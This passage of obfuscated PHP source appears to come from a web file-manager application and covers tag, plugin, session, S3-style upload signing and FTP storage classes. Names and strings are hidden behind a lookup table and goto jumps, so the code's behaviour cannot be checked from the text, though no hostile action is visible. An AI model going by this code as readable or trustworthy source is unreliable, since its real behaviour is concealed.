$´ê¿íé¥[$œâÕÀÃƒ[1290]] . $œâÕÀÃƒ[12]; } if ($ú¿¦ãé[$œâÕÀÃƒ[33]] == $œâÕÀÃƒ[2373] && isset($´ê¿íé¥[$œâÕÀÃƒ[192]])) { $ºÎ·„Ã[] = $´ê¿íé¥[$œâÕÀÃƒ[192]] . $œâÕÀÃƒ[12]; } } $ºÎ·„Ã = array_merge($ºÎ·„Ã, $İØ•Š‡, array($‰úô¹®Ø . $œâÕÀÃƒ[12])); $ºÎ·„Ã = array_unique($ºÎ·„Ã); $Š­ú÷ƒ = array_unique(array_to_keyvalue($ÎŸĞá¿, $œâÕÀÃƒ[12], $œâÕÀÃƒ[1539])); $¿Â×éû¹ = Model($œâÕÀÃƒ[624])->userListInfo($Š­ú÷ƒ); $‰ßµßÄš = Model($œâÕÀÃƒ[932])->sourceListInfo($ºÎ·„Ã, !0); foreach ($ÎŸĞá¿ as &$ú¿¦ãé) { if ($ú¿¦ãé[$œâÕÀÃƒ[33]] == $œâÕÀÃƒ[650] && isset($ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[1289]])) { $ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[1289]] = $‰ßµßÄš[$ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[1289]]]; $ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[1290]] = $‰ßµßÄš[$ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[1290]]]; } if ($ú¿¦ãé[$œâÕÀÃƒ[33]] == $œâÕÀÃƒ[2373] && isset($ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[192]])) { $ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[192]] = $‰ßµßÄš[$ú¿¦ãé[$œâÕÀÃƒ[547]][$œâÕÀÃƒ[192]]]; } $ú¿¦ãé[$œâÕÀÃƒ[90]] = $‰ßµßÄš[$ú¿¦ãé[$œâÕÀÃƒ[192]]]; $ú¿¦ãé[$œâÕÀÃƒ[2378]] = $‰ßµßÄš[$ú¿¦ãé[$œâÕÀÃƒ[2363]]]; if ($ú¿¦ãé[$œâÕÀÃƒ[33]] == $œâÕÀÃƒ[1277]) { $ú¿¦ãé[$œâÕÀÃƒ[2378]] = $ú¿¦ãé[$œâÕÀÃƒ[90]]; $ú¿¦ãé[$œâÕÀÃƒ[2363]] = $ú¿¦ãé[$œâÕÀÃƒ[2378]][$œâÕÀÃƒ[192]]; $ú¿¦ãé[$œâÕÀÃƒ[90]] = !1; $ú¿¦ãé[$œâÕÀÃƒ[192]] = $œâÕÀÃƒ[12]; } $ú¿¦ãé[$œâÕÀÃƒ[2302]] = $¿Â×éû¹[$ú¿¦ãé[$œâÕÀÃƒ[1539]]]; } unset($ú¿¦ãé); $‡¸ñê†ì[$œâÕÀÃƒ[446]] = $ÎŸĞá¿; return $‡¸ñê†ì; } public function removeBySource($¡°øñû¾) { $²¨ùøè = array($_SERVER[€ä¾™²][513] => $¡°øñû¾); $this->where($²¨ùøè)->remove(); } } goto e¥ó‹íìÈ; cäî©ÔÖœ·: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($·ÃøÇ Ê) { $Œ´‚ªñ¨ =& $_SERVER[€ä¾™²]; return array($Œ´‚ªñ¨[2238] => array($·ÃøÇ Ê[0], $Œ´‚ªñ¨[2239]), $Œ´‚ªñ¨[2240] => array($·ÃøÇ Ê[0], $Œ´‚ªñ¨[2241])); } protected function ___get($ƒ¿œ¦­²) { $·ôÄ·ış =& $_SERVER[€ä¾™²]; $Ğğ½¼ş© = Model($·ôÄ·ış[612])->metaGet($ƒ¿œ¦­², $·ôÄ·ış[2242]); $ÊË¡…ºº = json_decode($Ğğ½¼ş©, !0); return $ÊË¡…ºº ? $ÊË¡…ºº : array($·ôÄ·ış[2243] => $·ôÄ·ış[91], $·ôÄ·ış[446] => array()); } protected function ___listData($¯ĞÜÒ‡Ê) { $€ éÃÄƒ =& $_SERVER[€ä¾™²]; $áå°à¾ = array($€ éÃÄƒ[1913] => 0, $€ éÃÄƒ[580] => array($€ éÃÄƒ[2244], 0), $€ éÃÄƒ[518] => $€ éÃÄƒ[1437] . $¯ĞÜÒ‡Ê); $ÂàŠ¥¹‰ = $€ éÃÄƒ[2245]; $ë®éÉëİ = $this->field($ÂàŠ¥¹‰)->where($áå°à¾)->order($€ éÃÄƒ[2246])->select(); return $ë®éÉëİ ? $ë®éÉëİ : array(); } protected function set($“­ı¿ÛÑ, $Ä‘‹¼ÙÊ) { $¶áÂñÀ =& $_SERVER[€ä¾™²]; $Ä‘‹¼ÙÊ = $Ä‘‹¼ÙÊ ? $Ä‘‹¼ÙÊ : array($¶áÂñÀ[2243] => $¶áÂñÀ[91], $¶áÂñÀ[446] => array()); return Model($¶áÂñÀ[612])->metaSet($“­ı¿ÛÑ, $¶áÂñÀ[2242], json_encode($Ä‘‹¼ÙÊ)); } protected function getByTagID($Êæ‹æÀì, $‰°»¦È) { $‡ÎÔ“ =& $_SERVER[€ä¾™²]; if (!$Êæ‹æÀì || !$‰°»¦È) { return !1; } if (!Model($‡ÎÔ“[612])->getInfoSimple($Êæ‹æÀì)) { return !1; } $¬­àĞˆå = $this->get($Êæ‹æÀì); if (!$¬­àĞˆå || !isset($¬­àĞˆå[$‡ÎÔ“[446]])) { return !1; } $¢¤ï = array_find_by_field($¬­àĞˆå[$‡ÎÔ“[446]], $‡ÎÔ“[486], $‰°»¦È); return is_array($¢¤ï) ? $¢¤ï : !1; } public function listSource($ú•Àâ©, $Ş¶…²Ì·) { $äïíÌá =& $_SERVER[€ä¾™²]; if ($Ş¶…²Ì· && !is_array($Ş¶…²Ì·)) { $Ş¶…²Ì· = array($Ş¶…²Ì·); } $ÌºÕĞ®Š = $this->get($ú•Àâ©); $£íÏŒ±ë = array_to_keyvalue($ÌºÕĞ®Š[$äïíÌá[446]], $äïíÌá[486]); $ïÀî›§ = array_to_keyvalue($ÌºÕĞ®Š[$äïíÌá[605]], $äïíÌá[486]); $åïë¯Ë = $this->listData($ú•Àâ©); $¡ˆ¤ºÖ× = array(); foreach ($Ş¶…²Ì· as $şÙî÷ÓÏ) { $İ¡à’ìı = $£íÏŒ±ë[$şÙî÷ÓÏ]; $½”ËÜœß = _get($İ¡à’ìı, $äïíÌá[605]); if (!$İ¡à’ìı || !$½”ËÜœß || !$ïÀî›§[$½”ËÜœß]) { continue; } if (!$¡ˆ¤ºÖ×[$½”ËÜœß]) { $¡ˆ¤ºÖ×[$½”ËÜœß] = array(); } $¡ˆ¤ºÖ×[$½”ËÜœß][] = $şÙî÷ÓÏ; } $Âø°èá = array(); $Ëè´¼ŠÉ = array(); foreach ($åïë¯Ë as $¢—²Îô­) { $£–éÄ´œ = $¢—²Îô­[$äïíÌá[87]]; $İ¡à’ìı = $£íÏŒ±ë[$¢—²Îô­[$äïíÌá[522]]]; $½”ËÜœß = _get($İ¡à’ìı, $äïíÌá[605]); if (!$İ¡à’ìı || !$½”ËÜœß || !$¡ˆ¤ºÖ×[$½”ËÜœß] || !$£–éÄ´œ) { continue; } if (!in_array($¢—²Îô­[$äïíÌá[522]], $¡ˆ¤ºÖ×[$½”ËÜœß])) { continue; } if (!$Âø°èá[$£–éÄ´œ]) { $Âø°èá[$£–éÄ´œ] = array(); } $Âø°èá[$£–éÄ´œ][] = $½”ËÜœß; } foreach ($Âø°èá as $£–éÄ´œ => $Ûñ˜¾Æ) { if (count($Ûñ˜¾Æ) != count($¡ˆ¤ºÖ×)) { continue; } $Ëè´¼ŠÉ[] = $£–éÄ´œ; } if (!$Ş¶…²Ì·) { $Ëè´¼ŠÉ = array_to_keyvalue($åïë¯Ë, $äïíÌá[12], $äïíÌá[87]); } $Ëè´¼ŠÉ = array_unique($Ëè´¼ŠÉ); if (!$Ëè´¼ŠÉ) { return array(); } $¢¢É¹º = array($äïíÌá[513] => array($äïíÌá[514], $Ëè´¼ŠÉ), $äïíÌá[596] => $ú•Àâ©, $äïíÌá[189] => SourceModel::TYPE_GROUP); $ìªüØ¾¥ = Model($äïíÌá[1479])->listSource($¢¢É¹º); if (!$ìªüØ¾¥ || count($Ëè´¼ŠÉ) == $ìªüØ¾¥[$äïíÌá[443]][$äïíÌá[444]]) { return $ìªüØ¾¥; } $šõã©ï = array(); $£Î¸²º = array_to_keyvalue($ìªüØ¾¥[$äïíÌá[85]], $äïíÌá[12], $äïíÌá[192]); $‡ íåİ¤ = array_to_keyvalue($ìªüØ¾¥[$äïíÌá[86]], $äïíÌá[12], $äïíÌá[192]); $Ã¶ıÔÙÚ = array_merge($‡ íåİ¤, $£Î¸²º); foreach ($Ëè´¼ŠÉ as $£–éÄ´œ) { if (!in_array($£–éÄ´œ, $Ã¶ıÔÙÚ)) { $šõã©ï[] = $£–éÄ´œ; } } if ($šõã©ï) { $this->removeBySource($ú•Àâ©, $šõã©ï); } return $ìªüØ¾¥; } protected function addToTag($ùïàáÄ‡, $ñ…³ß‰Ø, $¿øºÛ¾) { $ëşŠºÇ =& $_SERVER[€ä¾™²]; if (!$this->getByTagID($ùïàáÄ‡, $¿øºÛ¾) || !$ñ…³ß‰Ø) { return !1; } if (!Model($ëşŠºÇ[932])->pathInfo($ñ…³ß‰Ø)) { return !1; } $—µŒîöù = array($ëşŠºÇ[1913] => 0, $ëşŠºÇ[580] => $¿øºÛ¾, $ëşŠºÇ[517] => $ñ…³ß‰Ø, $ëşŠºÇ[518] => $ëşŠºÇ[2247] . $ùïàáÄ‡, $ëşŠºÇ[516] => $ëşŠºÇ[12], $ëşŠºÇ[2132] => 0); if ($this->where($—µŒîöù)->find()) { return !1; } return $this->add($—µŒîöù); } protected function removeFromTag($ ÄàË×ã, $œó¦íˆ, $‚æà£Ú£) { $ï®ä§°§ =& $_SERVER[€ä¾™²]; if (!$this->getByTagID($ ÄàË×ã, $‚æà£Ú£) || !$œó¦íˆ) { return !1; } if (is_array($œó¦íˆ)) { $œó¦íˆ = array($ï®ä§°§[7], $œó¦íˆ); } $•Ã–Êë¦ = array($ï®ä§°§[1913] => 0, $ï®ä§°§[580] => $‚æà£Ú£, $ï®ä§°§[518] => $ï®ä§°§[2247] . $ ÄàË×ã, $ï®ä§°§[517] => $œó¦íˆ); return $this->where($•Ã–Êë¦)->delete(); } protected function removeByTag($î­´€‡Â, $ùÈÈù¼) { $ŸÍƒìÔ­ =& $_SERVER[€ä¾™²]; if (!$this->getByTagID($î­´€‡Â, $ùÈÈù¼)) { return !1; } $¡í½®ÜÆ = array($ŸÍƒìÔ­[1913] => 0, $ŸÍƒìÔ­[580] => $ùÈÈù¼, $ŸÍƒìÔ­[518] => $ŸÍƒìÔ­[2247] . $î­´€‡Â); return $this->where($¡í½®ÜÆ)->delete(); } protected function removeBySource($İ‰í«Íƒ, $„¢ü¤Ï) { $‰íš–Òœ =& $_SERVER[€ä¾™²]; if (!$İ‰í«Íƒ || !$„¢ü¤Ï) { return !1; } if (is_array($„¢ü¤Ï)) { $„¢ü¤Ï = array($‰íš–Òœ[7], $„¢ü¤Ï); } $¼Ø¥‰•ˆ = array($‰íš–Òœ[1913] => 0, $‰íš–Òœ[517] => $„¢ü¤Ï, $‰íš–Òœ[580] => array($‰íš–Òœ[1127], 0), $‰íš–Òœ[518] => $‰íš–Òœ[2247] . $İ‰í«Íƒ); return $this->where($¼Ø¥‰•ˆ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x70\x6c\165\147\x69\x6e\114\x69\163\164"; public $field = array("\156\141\x6d\145", "\x73\164\141\164\165\x73", "\x72\145\x67\x69\x65\x73\164", "\x63\157\156\146\151\x67"); public function loadList($‘¼Æˆà = false) { $’­ –‹› = array_to_keyvalue($this->listData(), $_SERVER[€ä¾™²][32]); if ($‘¼Æˆà) { return $’­ –‹›[$‘¼Æˆà]; } return $’­ –‹›; } public function init() { $ î–‰Å =& $_SERVER[€ä¾™²]; Hook::trigger($ î–‰Å[2248]); $ö¹¬ ¸ = $this->loadPluginList(); foreach ($ö¹¬ ¸ as $Ş¿¿èøŠ => $ë ‡Å©›) { $‘ô­î¹ = $this->appAllow($Ş¿¿èøŠ, $ë ‡Å©›); if (!$‘ô­î¹) { continue; } foreach ($ë ‡Å©›[$ î–‰Å[2249]] as $¨ê·û© => $›¹ı´ìõ) { Hook::bind($¨ê·û©, $›¹ı´ìõ); } } Hook::trigger($ î–‰Å[2250]); Hook::trigger(ACTION); } public function appAllow($°ÌóÊ, $ûûŠëÎù, $­Œ¢¸û = true) { $Êç¾´¹ë =& $_SERVER[€ä¾™²]; $©îø™¢Ú = PLUGIN_DIR . $°ÌóÊ . $Êç¾´¹ë[2251]; if (!is_array($ûûŠëÎù) || !is_array($ûûŠëÎù[$Êç¾´¹ë[2249]]) || $ûûŠëÎù[$Êç¾´¹ë[850]] != 1 || !is_file($©îø™¢Ú)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$Êç¾´¹ë[6]][$Êç¾´¹ë[2252]] || !$GLOBALS[$Êç¾´¹ë[6]][$Êç¾´¹ë[2253]]) { return !0; } $ŞŸ å”á = explode($Êç¾´¹ë[50], strtolower($GLOBALS[$Êç¾´¹ë[6]][$Êç¾´¹ë[2253]])); return in_array(strtolower($°ÌóÊ), $ŞŸ å”á) ? !1 : !0; } if ($­Œ¢¸û && !Action($Êç¾´¹ë[2254])->checkAuth($°ÌóÊ)) { return !1; } return !0; } public function unInstall($üğü‚¦Ä) { $ûº½‚ó =& $_SERVER[€ä¾™²]; $üÒåãÏ = $this->loadList($üğü‚¦Ä); if (file_exists(PLUGIN_DIR . $üğü‚¦Ä)) { Hook::apply($üğü‚¦Ä . $ûº½‚ó[2255]); } $this->remove($üÒåãÏ[$ûº½‚ó[486]]); } public function changeStatus($åØİ‹×ô, $„Í„†æá) { $¬ßÜÛÊ =& $_SERVER[€ä¾™²]; $óÑ™¦½— = $this->loadList($åØİ‹×ô); if ($„Í„†æá) { Hook::apply($åØİ‹×ô . $¬ßÜÛÊ[2256]); } $this->update($óÑ™¦½—[$¬ßÜÛÊ[486]], array($¬ßÜÛÊ[2257] => $„Í„†æá)); } public function appRegist($ßÈ¹ğçñ, $Çƒì‹ÂÁ) { $ßıÅš® =& $_SERVER[€ä¾™²]; $˜À‹¬×¡ = $this->loadList($ßÈ¹ğçñ); if ($˜À‹¬×¡) { $this->update($˜À‹¬×¡[$ßıÅš®[486]], array($ßıÅš®[2249] => $Çƒì‹ÂÁ)); } else { $»›«å–‰ = array($ßıÅš®[32] => $ßÈ¹ğçñ, $ßıÅš®[2249] => $Çƒì‹ÂÁ, $ßıÅš®[850] => 0, $ßıÅš®[6] => $this->getConfigDefault($ßÈ¹ğçñ)); $this->insert($»›«å–‰); } } public function getConfigDefault($šŞÊã•ø) { $¶Æ–ƒ× =& $_SERVER[€ä¾™²]; $À‹½ö½û = array(); $¢¡ÔĞ‹Å = $this->getPackageJson($šŞÊã•ø); if (!$¢¡ÔĞ‹Å && is_array($¢¡ÔĞ‹Å[$¶Æ–ƒ×[2258]])) { return $À‹½ö½û; } foreach ($¢¡ÔĞ‹Å[$¶Æ–ƒ×[2258]] as $Û›ÅÚ“» => $èš¸´şË) { if (!isset($èš¸´şË[$¶Æ–ƒ×[451]]) || isset($À‹½ö½û[$Û›ÅÚ“»])) { continue; } $À‹½ö½û[$Û›ÅÚ“»] = $èš¸´şË[$¶Æ–ƒ×[451]]; } return $À‹½ö½û; } public function getPackageJson($’Äüªƒ) { return Hook::apply($’Äüªƒ . $_SERVER[€ä¾™²][2259]); } public function getConfig($í÷ËûÛå, $˜¾ïïùÈ = false) { $›Å¿¹÷› =& $_SERVER[€ä¾™²]; $£••êİ‹ = array(); $í¡ª¿ÇÁ = $this->loadList($í÷ËûÛå); if ($í¡ª¿ÇÁ && is_array($í¡ª¿ÇÁ[$›Å¿¹÷›[6]])) { $£••êİ‹ = $í¡ª¿ÇÁ[$›Å¿¹÷›[6]]; } if (!$£••êİ‹ || $˜¾ïïùÈ) { $£••êİ‹ = $this->getConfigDefault($í÷ËûÛå); } return $£••êİ‹; } public function setConfig($Â‹·ôÑ”, $‹ÂĞ‰çæ = false) { $Ø¼ïäş¾ =& $_SERVER[€ä¾™²]; $¤÷Ïú‰ = $this->loadList($Â‹·ôÑ”); if (!$¤÷Ïú‰) { return !1; } $‰Š“ûôÒ = $¤÷Ïú‰[$Ø¼ïäş¾[6]]; if ($‹ÂĞ‰çæ == !1) { $‰Š“ûôÒ = array(); $‹ÂĞ‰çæ = $this->getConfigDefault($Â‹·ôÑ”); } foreach ($‹ÂĞ‰çæ as $ù§îş ± => $ì”¶óÀö) { $‰Š“ûôÒ[$ù§îş ±] = is_string($ì”¶óÀö) ? trim($ì”¶óÀö) : $ì”¶óÀö; } $this->update($¤÷Ïú‰[$Ø¼ïäş¾[486]], array($Ø¼ïäş¾[6] => $‰Š“ûôÒ)); } public function viewList() { $ôåßÓõ› =& $_SERVER[€ä¾™²]; $Ã‡Á™½é = $this->loadList(); $this->pluginScan($Ã‡Á™½é); $Ã‡Á™½é = $this->loadPluginList(); $—º´Ãã = array(); foreach ($Ã‡Á™½é as $„õ©ŒÎ => $Æ°É‚¢—) { $ùßöÌñ¤ = $Æ°É‚¢—; unset($Æ°É‚¢—[$ôåßÓõ›[2249]], $Æ°É‚¢—[$ôåßÓõ›[6]]); $µóÆ¨ì = PLUGIN_DIR . $Æ°É‚¢—[$ôåßÓõ›[32]] . $ôåßÓõ›[2251]; if (!is_file($µóÆ¨ì)) { continue; } $Êˆ‚ß€” = Hook::apply($Æ°É‚¢—[$ôåßÓõ›[32]] . $ôåßÓõ›[2259]); if (!is_array($Êˆ‚ß€”)) { continue; } $—º´Ãã[$„õ©ŒÎ] = array_merge($Æ°É‚¢—, $Êˆ‚ß€”); if ($ùßöÌñ¤[$ôåßÓõ›[6]][$ôåßÓõ›[1835]] != $Êˆ‚ß€”[$ôåßÓõ›[1809]]) { Hook::apply($Æ°É‚¢—[$ôåßÓõ›[32]] . $ôåßÓõ›[2256]); $ùßöÌñ¤[$ôåßÓõ›[6]][$ôåßÓõ›[1835]] = $Êˆ‚ß€”[$ôåßÓõ›[1809]]; $this->update($Æ°É‚¢—[$ôåßÓõ›[486]], array($ôåßÓõ›[6] => $ùßöÌñ¤[$ôåßÓõ›[6]])); } } return $—º´Ãã; } private function loadPluginList() { $âœ›Š¤¶ =& $_SERVER[€ä¾™²]; $ĞÔ´… = $this->loadList(); if (strtolower(MOD) == $âœ›Š¤¶[2260]) { return $ĞÔ´…; } $İÇŞœáÓ = Hook::trigger($âœ›Š¤¶[2261], $ĞÔ´…); if ($ĞÔ´… && !$İÇŞœáÓ) { die; } return $İÇŞœáÓ ? $İÇŞœáÓ : $ĞÔ´…; } private function pluginScan($Ú¶Å†—) { $›í‚Ã¥¹ =& $_SERVER[€ä¾™²]; recursion_dir(PLUGIN_DIR, $šş½Äüİ, $»ÔÍ†À, 0); foreach ($šş½Äüİ as $“òÄŞ«•) { $âÌ¶‰Àì = get_path_this($“òÄŞ«•); if (isset($Ú¶Å†—[$âÌ¶‰Àì]) || !file_exists($“òÄŞ«• . $›í‚Ã¥¹[2262]) || !file_exists($“òÄŞ«• . $›í‚Ã¥¹[2251])) { continue; } Hook::apply($âÌ¶‰Àì . $›í‚Ã¥¹[2256]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\137\163\x65\x73\163\151\x6f\x6e"; public function get($‘Ÿ©İ¾) { $‹íÚÄ™´ =& $_SERVER[€ä¾™²]; $ò–Áòè = $this->where(array($‹íÚÄ™´[2263] => $‘Ÿ©İ¾))->find(); if (!is_array($ò–Áòè)) { return !1; } return $ò–Áòè[$‹íÚÄ™´[169]]; } public function set($Öş«ÄÀî, $‹¸•ƒµ, $ä˜¬Õô = 3600) { $Ä¾¥èæ‰ =& $_SERVER[€ä¾™²]; $ıµ÷î = array($Ä¾¥èæ‰[2263] => $Öş«ÄÀî, $Ä¾¥èæ‰[2166] => $‹¸•ƒµ, $Ä¾¥èæ‰[2264] => $ä˜¬Õô + time()); if (Session::get($Ä¾¥èæ‰[2265])) { $ıµ÷î[$Ä¾¥èæ‰[1539]] = Session::get($Ä¾¥èæ‰[2265]); } else { $ıµ÷î[$Ä¾¥èæ‰[1539]] = 0; } if ($this->get($Öş«ÄÀî)) { return $this->where(array($Ä¾¥èæ‰[2263] => $Öş«ÄÀî))->save($ıµ÷î); } else { return $this->add($ıµ÷î, array(), !0); } } public function remove($ä”»Şê­) { return $this->where(array($_SERVER[€ä¾™²][2263] => $ä”»Şê­))->delete(); } public function clearTimeout() { return $this->where($_SERVER[€ä¾™²][2266] . time())->delete(); } } goto C¡ëŒ“§£ç; d¯Ş¹™†: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($˜™®ÆÅé) { parent::__construct($˜™®ÆÅé); $this->setSignVersion($_SERVER[€ä¾™²][248]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Äõüší) { parent::__construct($Äõüší); $this->setSignVersion($_SERVER[€ä¾™²][248]); } public function uploadFormData($Ã¢‡ı»®, $Ş±†Á¬÷ = 3600) { $”€§®Ê =& $_SERVER[€ä¾™²]; $¶ùù¬ù = $”€§®Ê[230]; $úëÃÎå = $”€§®Ê[258]; $“í•Õøã = $”€§®Ê[62]; $ƒÁùÍÜì = gmdate($”€§®Ê[259]); $™„æÀÕ¼ = gmdate($”€§®Ê[260]); $êÄ¡–æµ = $”€§®Ê[261]; $—µÃ—’æ = $Ş±†Á¬÷ . $”€§®Ê[12]; $Ü§¦¶î± = $”€§®Ê[262]; $Ş’úÒ³§ = array($this->accessKey, $™„æÀÕ¼, $this->region, $“í•Õøã, $êÄ¡–æµ); $…—¿€Ğ™ = implode($”€§®Ê[8], $Ş’úÒ³§); $¹ë‡´¡ = array($”€§®Ê[263] => gmdate($”€§®Ê[1471], strtotime($”€§®Ê[265])), $”€§®Ê[266] => array(array($”€§®Ê[267] => $this->bucket), array($”€§®Ê[307] => $¶ùù¬ù), array($”€§®Ê[268], $”€§®Ê[269], $”€§®Ê[12]), array($”€§®Ê[268], $”€§®Ê[270], $”€§®Ê[12]), array($”€§®Ê[268], $”€§®Ê[308], $”€§®Ê[12]), array($”€§®Ê[271] => $Ü§¦¶î±), array($”€§®Ê[272] => $…—¿€Ğ™), array($”€§®Ê[273] => $úëÃÎå), array($”€§®Ê[274] => $ƒÁùÍÜì), array($”€§®Ê[275] => $—µÃ—’æ))); $èÑÑì’± = base64_encode(json_encode($¹ë‡´¡)); $¬á°Øã = hash_hmac($”€§®Ê[276], $™„æÀÕ¼, $”€§®Ê[277] . $this->secret, !0); $ÇòËÁŞÛ = hash_hmac($”€§®Ê[276], $this->region, $¬á°Øã, !0); $ÇşÔ¤Œş = hash_hmac($”€§®Ê[276], $“í•Õøã, $ÇòËÁŞÛ, !0); $¹­Ù÷Ç¢ = hash_hmac($”€§®Ê[276], $êÄ¡–æµ, $ÇşÔ¤Œş, !0); $ÀŠÊ¯Ùğ = hash_hmac($”€§®Ê[276], $èÑÑì’±, $¹­Ù÷Ç¢); $óÇØé• = array($”€§®Ê[247] => $”€§®Ê[12], $”€§®Ê[295] => $”€§®Ê[12], $”€§®Ê[307] => $¶ùù¬ù, $”€§®Ê[271] => $Ü§¦¶î±, $”€§®Ê[278] => $èÑÑì’±, $”€§®Ê[309] => $…—¿€Ğ™, $”€§®Ê[310] => $úëÃÎå, $”€§®Ê[311] => $ƒÁùÍÜì, $”€§®Ê[312] => $—µÃ—’æ, $”€§®Ê[313] => $ÀŠÊ¯Ùğ, $”€§®Ê[207] => $this->getHost()); return $óÇØé•; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¤û¸»£¬) { parent::__construct(); if (count($¤û¸»£¬) > 0) { $this->_init($¤û¸»£¬); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($…ÙæòÄù) { $û“¸û” =& $_SERVER[€ä¾™²]; global $config; $this->appCharset = $config[$û“¸û”[1592]]; $this->systemCharset = $config[$û“¸û”[1593]]; if (isset($…ÙæòÄù[$û“¸û”[1594]]) && $…ÙæòÄù[$û“¸û”[1594]]) { $this->systemCharset = $…ÙæòÄù[$û“¸û”[1594]]; } } public function iconvApp($‰Á§Ô®Ş) { return $this->iconvTo($‰Á§Ô®Ş, $this->systemCharset, $this->appCharset); } public function iconvSystem($‹¯ß’ê) { return $this->iconvTo($‹¯ß’ê, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ì¢ê¸¦É) { $¥¥§é°‘ =& $_SERVER[€ä¾™²]; $æ£üÌº = $this->iconvApp($this->pathBase); $Ì¢ê¸¦É = $this->iconvApp($Ì¢ê¸¦É); if (substr($æ£üÌº, 0, 2) == $¥¥§é°‘[1469]) { $æ£üÌº = BASIC_PATH . substr($æ£üÌº, 2); } if (substr($Ì¢ê¸¦É, 0, 2) == $¥¥§é°‘[1469]) { $Ì¢ê¸¦É = BASIC_PATH . substr($Ì¢ê¸¦É, 2); } $æ£üÌº = KodIO::clear($æ£üÌº); $Ì¢ê¸¦É = KodIO::clear($Ì¢ê¸¦É); $Ì¢ê¸¦É = substr($Ì¢ê¸¦É, strlen($æ£üÌº)); if (empty($this->pathDriver)) { return $Ì¢ê¸¦É; } return $this->pathDriver . $¥¥§é°‘[8] . ltrim($Ì¢ê¸¦É, $¥¥§é°‘[8]); } private function _init($”©õ‰ŠÃ = array()) { $Õ”õùıè =& $_SERVER[€ä¾™²]; if (!function_exists($Õ”õùıè[1595])) { throw new Exception(LNG($Õ”õùıè[1596])); } $this->config = $”©õ‰ŠÃ; $this->charsetReset($”©õ‰ŠÃ); foreach ($”©õ‰ŠÃ as $çˆŠ•® => $—¿¡ì) { if (isset($this->{$çˆŠ•®})) { $this->{$çˆŠ•®} = $—¿¡ì; } } return $this->_login($”©õ‰ŠÃ); } private function _login($‘”•ç¨²) { $ ½ÌòË– =& $_SERVER[€ä¾™²]; static $‡ÃæìñÆ = array(); $ßÖë£ú¿ = md5(json_encode($‘”•ç¨²)); if (isset($‡ÃæìñÆ[$ßÖë£ú¿])) { foreach ($‡ÃæìñÆ[$ßÖë£ú¿] as $¥½ÂÕé› => $ó™Êü‡Ä) { $this->{$¥½ÂÕé›} = $ó™Êü‡Ä; } return !0; } $…¥Ç¯¦õ = parse_url(trim($this->server, $ ½ÌòË–[8])); $this->host = $…¥Ç¯¦õ[$ ½ÌòË–[207]]; $Ë¡àÖõ¼ = isset($…¥Ç¯¦õ[$ ½ÌòË–[206]]) && $…¥Ç¯¦õ[$ ½ÌòË–[206]] == $ ½ÌòË–[1597] ? !0 : !1; $this->scheme = $Ë¡àÖõ¼ ? $ ½ÌòË–[1598] : $ ½ÌòË–[1599]; $this->port = isset($…¥Ç¯¦õ[$ ½ÌòË–[208]]) ? $…¥Ç¯¦õ[$ ½ÌòË–[208]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ ½ÌòË–[1600]) . $this->host . $ ½ÌòË–[4] . $this->port, !0); return !1; } $Æû›“ØÙ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$Æû›“ØÙ) { $this->writeLog(LNG($ ½ÌòË–[1601]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ ½ÌòË–[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $©€ûïü = $this->pasv == $ ½ÌòË–[91] ? !0 : !1; @ftp_pasv($this->connect, $©€ûïü); $‡ÃæìñÆ[$ßÖë£ú¿] = array($ ½ÌòË–[1602] => $this->connect, $ ½ÌòË–[207] => $this->host, $ ½ÌòË–[206] => $this->scheme, $ ½ÌòË–[208] => $this->port); return $Æû›“ØÙ; } private function _isconn($öş¹³¸À = true) { if (is_resource($this->connect)) { return !0; } if (!$öş¹³¸À) { return !1; } return $this->_login($this->config); } public function mkfile($±Â›ã®³, $îİÕ¼ûŠ = '', $âºÓÓş = REPEAT_RENAME) { if ($this->setContent($±Â›ã®³, $îİÕ¼ûŠ)) { return $this->getPathOuter($±Â›ã®³); } $this->writeLog(LNG($_SERVER[€ä¾™²][1603]), !0); return !1; } public function mkdir($æƒ¸òíı, $ÖÂÄŒœ = REPEAT_SKIP) { $’—™ÉŸ =& $_SERVER[€ä¾™²]; if (!$æƒ¸òíı || $æƒ¸òíı == $’—™ÉŸ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $æƒ¸òíı = $this->iconvSystem($æƒ¸òíı); if ($this->_isFolder($æƒ¸òíı) || @ftp_mkdir($this->connect, $æƒ¸òíı)) { return $this->getPathOuter($æƒ¸òíı); } if (!$this->mkdir($this->pathFather($æƒ¸òíı))) { return !1; } if ($æƒ¸òíı = @ftp_mkdir($this->connect, $æƒ¸òíı)) { return $this->getPathOuter($æƒ¸òíı); } $á¾ƒ‰©È = __FUNCTION__ . $’—™ÉŸ[1604]; $this->writeLog($á¾ƒ‰©È, !0); return !1; } public function copyFile($ÈÙíÄ’ç, $‡Æ£èíñ) { if (!$this->_isconn()) { return !1; } $ò´è¢Úş = $this->pathThis($this->iconvSystem($ÈÙíÄ’ç)); $öá®ßŸ = $this->tempFile($ò´è¢Úş); $š×’ÈÓÃ = $this->iconvApp($öá®ßŸ); $this->download($ÈÙíÄ’ç, $š×’ÈÓÃ); 